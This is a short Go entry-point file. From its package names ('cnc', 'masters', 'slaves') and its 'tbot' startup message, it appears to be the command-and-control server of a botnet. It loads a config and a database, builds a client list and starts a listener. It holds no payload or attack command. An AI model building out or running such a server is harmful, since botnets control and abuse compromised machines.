package main

import (
	"cnc/core/config"
	"cnc/core/database"
	"cnc/core/masters"
	"cnc/core/slaves"
	"fmt"
)

func main() {
	fmt.Println("starting tbot change me wtv")

	if err := config.LoadConfig("./assets/config.json"); err != nil {
		panic(err)
	}

	if err := database.NewDatabase(config.Config.Database.Path); err != nil {
		panic(err)
	}

	slaves.NewClientList()
	masters.Listen()
}
